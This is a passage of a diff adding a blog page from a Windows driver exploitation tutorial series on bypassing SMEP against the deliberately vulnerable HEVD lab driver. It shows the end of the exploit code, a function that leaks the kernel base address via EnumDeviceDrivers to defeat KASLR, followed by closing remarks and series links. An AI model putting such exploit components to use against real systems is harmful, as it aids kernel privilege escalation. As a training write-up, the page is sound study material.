+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>}
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>UINT64 <span style="color:#a6e22e">GetKernelBaseAddress</span>() 
+</span></span><span style="display:flex;"><span>{
+</span></span><span style="display:flex;"><span>    ULONG_PTR  pKernelBaseAddress <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>    LPVOID    <span style="color:#f92672">*</span>lpImageBase <span style="color:#f92672">=</span> NULL;
+</span></span><span style="display:flex;"><span>    DWORD      dwBytesNeeded <span style="color:#f92672">=</span> <span style="color:#ae81ff">0</span>;
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">EnumDeviceDrivers</span>(NULL, <span style="color:#ae81ff">0</span>, <span style="color:#f92672">&amp;</span>dwBytesNeeded)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to retrieve size needed for device driver entries</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span>(lpImageBase <span style="color:#f92672">=</span> (LPVOID <span style="color:#f92672">*</span>)<span style="color:#a6e22e">HeapAlloc</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, dwBytesNeeded))) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] Failed to allocate space for lpImageBase</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (lpImageBase) 
+</span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpImageBase);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">if</span> (<span style="color:#f92672">!</span><span style="color:#a6e22e">EnumDeviceDrivers</span>(lpImageBase, dwBytesNeeded, <span style="color:#f92672">&amp;</span>dwBytesNeeded)) {
+</span></span><span style="display:flex;"><span>        <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[-] EnumDeviceDrivers failed: %d&#34;</span>, <span style="color:#a6e22e">GetLastError</span>());
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">if</span> (lpImageBase) 
+</span></span><span style="display:flex;"><span>             <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpImageBase);
+</span></span><span style="display:flex;"><span>        <span style="color:#66d9ef">return</span> <span style="color:#f92672">-</span><span style="color:#ae81ff">1</span>;
+</span></span><span style="display:flex;"><span>    }
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    pKernelBaseAddress <span style="color:#f92672">=</span> ((ULONG_PTR <span style="color:#f92672">*</span>)lpImageBase)[<span style="color:#ae81ff">0</span>];
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">HeapFree</span>(<span style="color:#a6e22e">GetProcessHeap</span>(), <span style="color:#ae81ff">0</span>, lpImageBase);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">printf</span>(<span style="color:#e6db74">&#34;[+] Kernel Base Address calculated: %llx</span><span style="color:#ae81ff">\n</span><span style="color:#e6db74">&#34;</span>, pKernelBaseAddress);
+</span></span><span style="display:flex;"><span>
+</span></span><span style="display:flex;"><span>    <span style="color:#66d9ef">return</span> (UINT64)pKernelBaseAddress;
+</span></span><span style="display:flex;"><span>}
+</span></span></code></pre></div><h2 id="final-thoughts">Final thoughts</h2>
+<p>That was a long post, but hopefully some people stuck with me for it.  The next post will be about bypassing VBS, the newest mitigation for local kernel exploitation.  Once you can do that, you can start writing exploits for brand new Windows 11 systems.</p>
+<p>I&rsquo;m starting a new job soon so I&rsquo;m not sure when I&rsquo;m going to have a chance to post next.  I highly recommend reading through some of the writeups linked on the <a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver" target="_blank">HEVD Github</a> if you want to continue in the meantime.</p>
+<p>Thanks for sticking with me so far, hope to see you again in the future!</p>
+<h2 id="more-reading">More reading</h2>
+<ul>
+<li><a href="https://github.com/hacksysteam/HackSysExtremeVulnerableDriver?tab=readme-ov-file#external-blog-posts" target="_blank">HEVD External Blog Posts</a></li>
+</ul>
+<h2 id="series-index">Series Index</h2>
+<ul>
+<li><a href="https://stolenfootball.github.io/posts/series/windows_drivers/p1_overview/index.html" target="_blank">Part 1 - Overview</a></li>
+<li><a href="https://stolenfootball.github.io/posts/series/windows_drivers/p2_whats_a_driver/index.html" target="_blank">Part 2 - What&rsquo;s a Driver Anyways?</a></li>
+<li><a href="https://stolenfootball.github.io/posts/series/windows_drivers/p3_minimum_viable_driver/index.html" target="_blank">Part 3 - The Minimum Viable Driver</a></li>
+<li><a href="https://stolenfootball.github.io/posts/series/windows_drivers/p4_interacting_with_driver/" target="_blank">Part 4 - Interacting with the Driver</a></li>
+<li><a href="https://stolenfootball.github.io/posts/series/windows_drivers/p5_basic_driver_function/" target="_blank">Part 5 - Basic Driver Functionality</a></li>
+<li><a href="https://stolenfootball.github.io/posts/series/windows_drivers/p6_debugging_drivers/" target="_blank">Part 6 - Debugging and Basic Rev</a></li>
+<li><a href="https://stolenfootball.github.io/posts/series/windows_drivers/p7_buffer_overflow_win7/" target="_blank">Part 7 - Buffer Overflow on Windows 7</a></li>
+<li><a href="https://stolenfootball.github.io/posts/series/windows_drivers/p8_smep_bypass/" target="_blank">Part 8 - Bypassing SMEP</a></li>
+</ul>
+
+  
+  <hr>
+<div class="footer">
+    
+	    
+            <a class="previous-post" href="https://stolenfootball.github.io/posts/series/windows_drivers/p7_buffer_overflow_win7/?ref=footer"><span style="font-weight:bold;">« Previous</span><br>Windows Drivers Series Part 7 - Buffer Overflow on...</a>
+        
+	    
+    
+</div>
+
+  
+</div>
+            </main>
+            
+  
+    <div class="article-toc ">
+    <div class="toc-wrapper">
+      <h4 id="contents"></h4>
+      <nav id="TableOfContents">
+  <ul>
+    <li><a href="#setup">Setup</a></li>
+    <li><a href="#rev-the-vulnerable-function">Rev the vulnerable function</a></li>
+    <li><a href="#modify-the-exploit-for-x64">Modify the exploit for x64</a></li>
+    <li><a href="#smap--smep">SMAP / SMEP</a></li>
+    <li><a href="#disabling-smep">Disabling SMEP</a></li>
+    <li><a href="#what-to-set-smep-to">What to set SMEP to</a></li>
+    <li><a href="#rop-to-disable-smep">ROP to disable SMEP</a></li>
+    <li><a href="#cleanup">Cleanup</a></li>
+    <li><a href="#defeating-kaslr">Defeating KASLR</a></li>
+    <li><a href="#final-exploit">Final exploit</a></li>
+    <li><a href="#final-thoughts">Final thoughts</a></li>
+    <li><a href="#more-reading">More reading</a></li>
+    <li><a href="#series-index">Series Index</a></li>
+  </ul>
+</nav>
+    </div>
+</div>
+
+  
+
+        </div>
+    </body>
+</html>
